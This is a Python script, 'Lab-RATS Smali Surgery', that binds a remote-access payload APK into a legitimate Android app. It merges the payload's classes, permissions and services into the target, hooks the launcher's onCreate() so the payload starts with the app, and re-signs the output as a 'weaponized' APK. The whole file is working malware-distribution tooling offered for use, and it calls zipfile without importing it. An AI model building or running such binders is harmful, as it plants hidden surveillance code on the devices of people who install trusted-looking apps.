#!/usr/bin/env python3
"""
===================================================================
                       Lab-RATS Smali Surgery
                 APK Binding & Infection Engine
                         v1.6.0 Hardened
===================================================================
Developed by K4N3CO © 2026

Automated Smali Surgery Engine:
1. Decompiles clean target APK and Lab-RATS payload APK via apktool.
2. Merges Lab-RATS Smali classes, assets, and native libraries.
3. Injects permissions & service/receiver components into target AndroidManifest.xml.
4. Identifies target's main launcher Activity and hooks onCreate() with LabRatsWorker.init().
5. Recompiles, zipaligns, and signs the weaponized bound APK.
"""

import sys
import os
import shutil
import subprocess
import urllib.request
import re
import argparse
import xml.etree.ElementTree as ET

ANDROID_NS = "http://schemas.android.com/apk/res/android"
ET.register_namespace('android', ANDROID_NS)

BANNER = """
 ┌───────────────────────────────────────────────────────────────────────┐
 │                                                                       │
 │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │
 │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │
 │     ██║     ███████║██████╔╝█████╗██████╔╝███████║  ██████╗    │
 │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │
 │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
 │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
 │                                                                       │
 │     ---------> Smali Surgery & APK Binding Engine <----------         │
 │                         DEVELOPED BY K4N3CO                           │
 └───────────────────────────────────────────────────────────────────────┘
"""

APKTOOL_URL = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"


def log_info(msg):
    print(f"\033[36m[*] {msg}\033[0m")


def log_success(msg):
    print(f"\033[32m[✓] {msg}\033[0m")


def log_warn(msg):
    print(f"\033[33m[!] {msg}\033[0m")


def log_err(msg):
    print(f"\033[31m[!] {msg}\033[0m")


def run_cmd(cmd, check=True):
    log_info(f"Executing: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    res = subprocess.run(cmd, shell=isinstance(cmd, str), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        log_err(f"Command failed with code {res.returncode}:\n{res.stderr}")
        raise RuntimeError(f"Command failed: {res.stderr}")
    return res.stdout, res.stderr, res.returncode


def get_apktool_cmd(script_dir):
    """Detect or download apktool."""
    # Check system apktool
    if shutil.which("apktool"):
        return ["apktool"]

    tools_dir = os.path.join(script_dir, "tools")
    os.makedirs(tools_dir, exist_ok=True)
    jar_path = os.path.join(tools_dir, "apktool.jar")

    if not os.path.exists(jar_path):
        log_warn("Apktool not found on system PATH. Downloading apktool.jar v2.9.3...")
        try:
            urllib.request.urlretrieve(APKTOOL_URL, jar_path)
            log_success(f"Downloaded apktool.jar to {jar_path}")
        except Exception as e:
            log_err(f"Failed to download apktool: {e}")
            sys.exit(1)

    return ["java", "-jar", jar_path]


def extract_bundle_if_needed(apk_path, work_dir):
    """Detect if target APK is an XAPK / APKM / APKS zip bundle containing base.apk."""
    if zipfile.is_zipfile(apk_path):
        try:
            with zipfile.ZipFile(apk_path, 'r') as z:
                names = z.namelist()
                if "base.apk" in names:
                    log_info(f"Target {os.path.basename(apk_path)} is an XAPK/APKM App Bundle container. Extracting base.apk...")
                    extract_dir = os.path.join(work_dir, "bundle_extracted")
                    os.makedirs(extract_dir, exist_ok=True)
                    z.extractall(extract_dir)
                    base_apk = os.path.join(extract_dir, "base.apk")
                    if os.path.exists(base_apk):
                        log_success("Extracted standalone base.apk from App Bundle container.")
                        return base_apk
        except Exception as e:
            log_warn(f"Bundle check notice: {e}")
    return apk_path


def decompile_apk(apktool_cmd, apk_path, output_dir):
    log_info(f"Decompiling {os.path.basename(apk_path)}...")
    if os.path.exists(output_dir):
        shutil.rmtree(output_dir)
    cmd = apktool_cmd + ["d", "-f", "-o", output_dir, apk_path]
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    manifest_path = os.path.join(output_dir, "AndroidManifest.xml")
    if not os.path.exists(manifest_path):
        log_warn("Standard decompilation failed to produce AndroidManifest.xml. Retrying with resource-preservation (-r)...")
        if os.path.exists(output_dir):
            shutil.rmtree(output_dir)
        cmd_fallback = apktool_cmd + ["d", "-f", "-r", "-o", output_dir, apk_path]
        run_cmd(cmd_fallback)


def merge_smali_and_assets(payload_dir, target_dir):
    log_info("Merging payload Smali classes and assets into target...")

    # Find max smali index in target
    target_smali_dirs = [d for d in os.listdir(target_dir) if d == "smali" or d.startswith("smali_classes")]
    max_idx = 1
    for sd in target_smali_dirs:
        if sd == "smali":
            continue
        m = re.match(r"smali_classes(\d+)", sd)
        if m:
            idx = int(m.group(1))
            if idx > max_idx:
                max_idx = idx

    # Target directory for payload classes
    dest_smali_dir = os.path.join(target_dir, f"smali_classes{max_idx + 1}")
    os.makedirs(dest_smali_dir, exist_ok=True)

    # Copy all smali subdirectories from payload smali folders
    payload_smali_dirs = [d for d in os.listdir(payload_dir) if d == "smali" or d.startswith("smali_classes")]
    for psd in payload_smali_dirs:
        psd_path = os.path.join(payload_dir, psd)
        for item in os.listdir(psd_path):
            src_item = os.path.join(psd_path, item)
            dst_item = os.path.join(dest_smali_dir, item)

            # Check if target already has this package in main smali
            if os.path.exists(os.path.join(target_dir, "smali", item)) and item != "com":
                continue

            if os.path.isdir(src_item):
                if not os.path.exists(dst_item):
                    shutil.copytree(src_item, dst_item)
                else:
                    # Merge directories
                    for root, dirs, files in os.walk(src_item):
                        rel_path = os.path.relpath(root, src_item)
                        target_root = os.path.join(dst_item, rel_path)
                        os.makedirs(target_root, exist_ok=True)
                        for f in files:
                            sf = os.path.join(root, f)
                            df = os.path.join(target_root, f)
                            if not os.path.exists(df):
                                shutil.copy2(sf, df)

    # Copy Assets
    payload_assets = os.path.join(payload_dir, "assets")
    target_assets = os.path.join(target_dir, "assets")
    if os.path.exists(payload_assets):
        os.makedirs(target_assets, exist_ok=True)
        for root, dirs, files in os.walk(payload_assets):
            rel = os.path.relpath(root, payload_assets)
            dst_root = os.path.join(target_assets, rel)
            os.makedirs(dst_root, exist_ok=True)
            for f in files:
                sf = os.path.join(root, f)
                df = os.path.join(dst_root, f)
                if not os.path.exists(df):
                    shutil.copy2(sf, df)

    log_success("Payload Smali classes and assets successfully merged.")


def merge_resources(payload_dir, target_dir):
    log_info("Merging payload resources (drawables, mipmaps, values) into target...")
    payload_res = os.path.join(payload_dir, "res")
    target_res = os.path.join(target_dir, "res")

    if os.path.exists(payload_res):
        os.makedirs(target_res, exist_ok=True)
        skip_bases = {"ic_launcher", "ic_launcher_round", "ic_launcher_foreground", "ic_launcher_background"}
        for root, dirs, files in os.walk(payload_res):
            rel = os.path.relpath(root, payload_res)
            dst_root = os.path.join(target_res, rel)
            os.makedirs(dst_root, exist_ok=True)

            existing_bases = set()
            if os.path.exists(dst_root):
                for existing_f in os.listdir(dst_root):
                    ebase, _ = os.path.splitext(existing_f)
                    existing_bases.add(ebase.lower())

            for f in files:
                sf = os.path.join(root, f)
                df = os.path.join(dst_root, f)
                f_base, _ = os.path.splitext(f)
                f_base_lower = f_base.lower()

                if f_base_lower in skip_bases or f_base_lower in existing_bases:
                    continue

                if not os.path.exists(df):
                    shutil.copy2(sf, df)
                    existing_bases.add(f_base_lower)

    # Merge values/*.xml (styles, colors, strings)
    payload_values = os.path.join(payload_res, "values")
    target_values = os.path.join(target_res, "values")
    if os.path.exists(payload_values) and os.path.exists(target_values):
        for xml_file in ["styles.xml", "colors.xml", "strings.xml", "drawables.xml"]:
            p_xml = os.path.join(payload_values, xml_file)
            t_xml = os.path.join(target_values, xml_file)
            if os.path.exists(p_xml) and os.path.exists(t_xml):
                try:
                    p_tree = ET.parse(p_xml)
                    t_tree = ET.parse(t_xml)
                    p_root = p_tree.getroot()
                    t_root = t_tree.getroot()
                    existing_names = {c.attrib.get('name') for c in t_root if c.attrib.get('name')}
                    added = False
                    for elem in p_root:
                        name = elem.attrib.get('name')
                        if name and name not in existing_names:
                            t_root.append(elem)
                            existing_names.add(name)
                            added = True
                    if added:
                        t_tree.write(t_xml, encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    log_warn(f"Values merge notice for {xml_file}: {e}")

    log_success("Payload resources successfully merged into target res directory.")


def sanitize_manifest_and_resources(target_dir):
    log_info("Sanitizing AndroidManifest.xml and resources for AAPT2 compatibility...")
    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
    if os.path.exists(manifest_path):
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        hex_map = {
            '0x40000009': 'dataSync|location|specialUse',
            '0x40000001': 'dataSync|specialUse',
            '0x40000000': 'specialUse',
            '0x00000001': 'dataSync',
            '0x00000008': 'location',
            '0x00000040': 'camera',
            '0x00000080': 'microphone',
            '0x00000020': 'mediaProjection'
        }

        for hex_val, flag_str in hex_map.items():
            content = content.replace(f'android:foregroundServiceType="{hex_val}"', f'android:foregroundServiceType="{flag_str}"')

        content = re.sub(r'android:foregroundServiceType="0x[0-9a-fA-F]+"', 'android:foregroundServiceType="dataSync|location|camera|microphone|specialUse"', content)

        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)

    res_dir = os.path.join(target_dir, "res")
    if os.path.exists(res_dir):
        for root, _, files in os.walk(res_dir, topdown=False):
            for file in files:
                if file.endswith(".xml"):
                    xml_path = os.path.join(root, file)
                    try:
                        with open(xml_path, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()

                        # 1. Remove auto-generated API-versioned colors.xml (values-v34/colors.xml, etc.) containing private framework aliases
                        if ("colors" in file and "values-v" in root) or ("colors" in file and ("bright_foreground" in content or "btn_default_material" in content or "accent_device" in content or "background_floating" in content)):
                            os.remove(xml_path)
                            continue

                        lines = content.splitlines()
                        new_lines = []
                        modified = False
                        for line in lines:
                            if "APKTOOL_DUMMY" in line:
                                modified = True
                                continue

                            # 2. Strip <color> or <item> tags pointing to framework colors
                            if ("<color" in line or "<item" in line) and ("android:color/" in line or "bright_foreground" in line or "btn_default" in line or "accent_device" in line or "background_floating" in line or "background_material" in line or "car_blue" in line or "GM2_grey" in line):
                                modified = True
                                continue

                            # 3. Strip <item>, <color>, <dimen>, or <drawable> tags whose inner value points to a framework resource
                            if ("<item" in line or "<color" in line or "<dimen" in line or "<drawable" in line) and re.search(r'>\s*@\*?android:[^<]+<', line):
                                modified = True
                                continue

                            # 4. Clean invalid $ characters in drawable names
                            if "$" in line:
                                line = line.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')
                                modified = True

                            # 5. Convert remaining public framework references (@android:) to private (@*android:)
                            if "@android:" in line:
                                line = line.replace("@android:color/", "@*android:color/").replace("@android:style/", "@*android:style/").replace("@android:attr/", "@*android:attr/").replace("@android:dimen/", "@*android:dimen/").replace("@android:drawable/", "@*android:drawable/").replace("@android:string/", "@*android:string/").replace("@android:", "@*android:")
                                modified = True

                            new_lines.append(line)

                        if modified:
                            with open(xml_path, "w", encoding="utf-8") as f:
                                f.write("\n".join(new_lines))
                    except Exception:
                        pass

    log_success("Manifest & private framework resource attributes sanitized.")


def merge_manifests(payload_dir, target_dir):
    log_info("Performing AndroidManifest.xml surgery...")
    target_manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
    payload_manifest_path = os.path.join(payload_dir, "AndroidManifest.xml")

    with open(target_manifest_path, 'r', encoding='utf-8') as f:
        target_xml = f.read()

    with open(payload_manifest_path, 'r', encoding='utf-8') as f:
        payload_xml = f.read()

    pkg_match = re.search(r'package="([^"]+)"', target_xml)
    target_pkg = pkg_match.group(1) if pkg_match else "com.target.app"

    # Extract uses-permission tags from payload
    permissions = re.findall(r'(<uses-permission[^>]+/>)', payload_xml)
    added_perms = 0
    for perm in permissions:
        name_match = re.search(r'android:name="([^"]+)"', perm)
        if name_match:
            perm_name = name_match.group(1)
            if perm_name not in target_xml:
                if "<application" in target_xml:
                    target_xml = target_xml.replace("<application", f"    {perm}\n    <application", 1)
                    added_perms += 1

    # Extract Lab-RATS components
    components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*android:name="com\.labs\.labrats\.[^>]+>(?:.*?</(?:service|receiver|provider|activity)>|))', payload_xml, re.DOTALL)
    if not components:
        components = re.findall(r'(<(?:service|receiver|provider|activity)[^>]*com\.labs\.labrats[^>]+/>)', payload_xml)

    added_comps = 0
    for comp in components:
        comp_clean = comp.strip()
        # Prevent provider authority conflicts
        if "<provider" in comp_clean and "android:authorities=" in comp_clean:
            comp_clean = re.sub(r'android:authorities="([^"]+)"', f'android:authorities="{target_pkg}.\\1"', comp_clean)

        if "com.labs.labrats" in comp_clean and comp_clean not in target_xml:
            target_xml = target_xml.replace("</application>", f"        {comp_clean}\n    </application>", 1)
            added_comps += 1

    with open(target_manifest_path, 'w', encoding='utf-8') as f:
        f.write(target_xml)

    log_success(f"Manifest Surgery Complete: Injected {added_perms} permissions and {added_comps} components.")


def find_launcher_activity(target_dir):
    manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
    tree = ET.parse(manifest_path)
    root = tree.getroot()

    package_name = root.attrib.get('package', '')
    app_elem = root.find('application')
    if app_elem is None:
        raise RuntimeError("No <application> element found in target AndroidManifest.xml")

    for act in app_elem.findall('activity') + app_elem.findall('activity-alias'):
        for intent in act.findall('intent-filter'):
            has_main = False
            has_launcher = False
            for action in intent.findall('action'):
                if action.attrib.get(f'{{{ANDROID_NS}}}name') == 'android.intent.action.MAIN':
                    has_main = True
            for cat in intent.findall('category'):
                if cat.attrib.get(f'{{{ANDROID_NS}}}name') == 'android.intent.category.LAUNCHER':
                    has_launcher = True

            if has_main and has_launcher:
                act_name = act.attrib.get(f'{{{ANDROID_NS}}}name')
                if act_name.startswith('.'):
                    act_name = package_name + act_name
                elif '.' not in act_name:
                    act_name = package_name + '.' + act_name
                return act_name

    raise RuntimeError("Launcher activity not found in target AndroidManifest.xml")


def hook_launcher_activity(target_dir, launcher_class):
    log_info(f"Injecting Smali hook into Launcher Activity: {launcher_class}")
    class_rel_path = launcher_class.replace('.', '/') + ".smali"

    smali_file = None
    for root, dirs, files in os.walk(target_dir):
        if "smali" in root:
            potential_path = os.path.join(root, class_rel_path)
            if os.path.exists(potential_path):
                smali_file = potential_path
                break

    if not smali_file:
        log_err(f"Could not find smali file for launcher class: {launcher_class}")
        sys.exit(1)

    with open(smali_file, 'r', encoding='utf-8') as f:
        content = f.read()

    hook_code = "\n    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"

    if "onCreate(" in content:
        def reg_replacer(match):
            header = match.group(1)
            body = match.group(2)
            reg_match = re.search(r'\.registers\s+(\d+)', header)
            if reg_match:
                reg_count = int(reg_match.group(1))
                if reg_count < 2:
                    header = header.replace(f".registers {reg_count}", ".registers 2")
            return header + body + hook_code

        pattern = r'(\.method\s+[^I]*onCreate\(Landroid/os/Bundle;\)V.*?)(?:\.prologue|\n\s*invoke-super[^\n]+)'
        if re.search(pattern, content, re.DOTALL):
            content = re.sub(pattern, reg_replacer, content, count=1, flags=re.DOTALL)
            log_success("Successfully hooked existing onCreate() method with register safety.")
        else:
            content = content.replace("onCreate(Landroid/os/Bundle;)V", "onCreate(Landroid/os/Bundle;)V\n" + hook_code, 1)
            log_success("Hook injected into onCreate() method header.")
    else:
        new_on_create = f"""
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 2

    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
{hook_code}
    return-void
.endmethod
"""
        content += new_on_create
        log_success("Created and hooked new onCreate() method in launcher class.")

    with open(smali_file, 'w', encoding='utf-8') as f:
        f.write(content)


def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, storepass, keyalias):
    log_info("Rebuilding bound APK with apktool...")
    unsigned_apk = os.path.join(script_dir, "temp_binder", "unsigned_bound.apk")
    aligned_apk = os.path.join(script_dir, "temp_binder", "aligned_bound.apk")

    # Detect native stable AAPT1 (v1) to prevent AAPT2 exit code 138 SIGBUS crashes
    aapt_flag = []
    sdk_bt = os.path.expanduser("~/Library/Android/sdk/build-tools")
    if os.path.exists(sdk_bt):
        stable = [d for d in os.listdir(sdk_bt) if d.startswith("3") and not d.startswith("37")]
        if stable:
            stable.sort()
            bt_path = os.path.join(sdk_bt, stable[-1])
            aapt1 = os.path.join(bt_path, "aapt")
            if os.path.exists(aapt1):
                aapt_flag = ["--aapt", aapt1]

    cmd = apktool_cmd + ["b"] + aapt_flag + ["--no-crunch", target_dir, "-o", unsigned_apk]
    try:
        run_cmd(cmd)
    except Exception:
        log_warn("Retrying build with apktool default AAPT...")
        cmd_fallback = apktool_cmd + ["b", "-c", "--no-crunch", target_dir, "-o", unsigned_apk]
        run_cmd(cmd_fallback)

    # ZipAlign
    log_info("Aligning APK bytes with zipalign...")
    if shutil.which("zipalign"):
        run_cmd(["zipalign", "-p", "-f", "-v", "4", unsigned_apk, aligned_apk])
    else:
        log_warn("zipalign not found on system PATH; skipping alignment step.")
        aligned_apk = unsigned_apk

    # Sign APK
    log_info("Signing bound APK...")
    if shutil.which("apksigner"):
        run_cmd(["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}", "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk])
    elif shutil.which("jarsigner"):
        run_cmd(["jarsigner", "-verbose", "-sigalg", "SHA256withRSA", "-digestalg", "SHA-256", "-keystore", keystore_path, "-storepass", storepass, aligned_apk, keyalias])
        shutil.copy2(aligned_apk, output_apk)
    else:
        log_err("Neither apksigner nor jarsigner found on system PATH!")
        sys.exit(1)

    if not os.path.exists(output_apk):
        shutil.copy2(aligned_apk, output_apk)

    try:
        shutil.copy2(output_apk, os.path.join(script_dir, "bind_output", "bound_target.apk"))
    except Exception:
        pass

    log_success(f"WEAPONIZED BOUND APK READY: {output_apk}")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Lab-RATS Smali Surgery & APK Binding Engine")
    parser.add_argument("--target", required=True, help="Path to target clean APK")
    parser.add_argument("--payload", help="Path to Lab-RATS payload APK")
    parser.add_argument("--output", help="Path to output bound APK")
    parser.add_argument("--keystore", help="Path to JKS keystore")
    parser.add_argument("--storepass", default="lab-rats123", help="Keystore password")
    parser.add_argument("--keyalias", default="lab-rats-key", help="Key alias")

    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.realpath(__file__))
    project_dir = os.path.dirname(script_dir)

    target_apk = os.path.abspath(args.target)
    if not os.path.exists(target_apk):
        log_err(f"Target APK not found: {target_apk}")
        sys.exit(1)

    payload_apk = args.payload
    if not payload_apk:
        default_payloads = [
            os.path.join(script_dir, "output", "signed_v1.apk"),
            os.path.join(project_dir, "app", "build", "outputs", "apk", "release", "app-release.apk"),
            os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
        ]
        for p in default_payloads:
            if os.path.exists(p):
                payload_apk = p
                break

    if not payload_apk or not os.path.exists(payload_apk):
        log_err("Payload APK not found! Please build Lab-RATS APK first or specify --payload.")
        sys.exit(1)

    output_dir = os.path.join(project_dir, "bind_output")
    os.makedirs(output_dir, exist_ok=True)
    os.makedirs(os.path.join(script_dir, "bind_output"), exist_ok=True)
    output_apk = args.output or os.path.join(output_dir, "bound_target.apk")

    keystore_path = args.keystore or os.path.join(project_dir, "lab-rats-keystore.jks")

    apktool_cmd = get_apktool_cmd(script_dir)

    work_dir = os.path.join(script_dir, "temp_binder")
    os.makedirs(work_dir, exist_ok=True)

    payload_dir = os.path.join(work_dir, "payload")
    target_dir = os.path.join(work_dir, "target")

    try:
        target_apk = extract_bundle_if_needed(target_apk, work_dir)
        decompile_apk(apktool_cmd, payload_apk, payload_dir)
        decompile_apk(apktool_cmd, target_apk, target_dir)

        merge_smali_and_assets(payload_dir, target_dir)
        merge_resources(payload_dir, target_dir)
        merge_manifests(payload_dir, target_dir)
        sanitize_manifest_and_resources(target_dir)

        launcher_class = find_launcher_activity(target_dir)
        hook_launcher_activity(target_dir, launcher_class)

        recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, args.storepass, args.keyalias)

    finally:
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
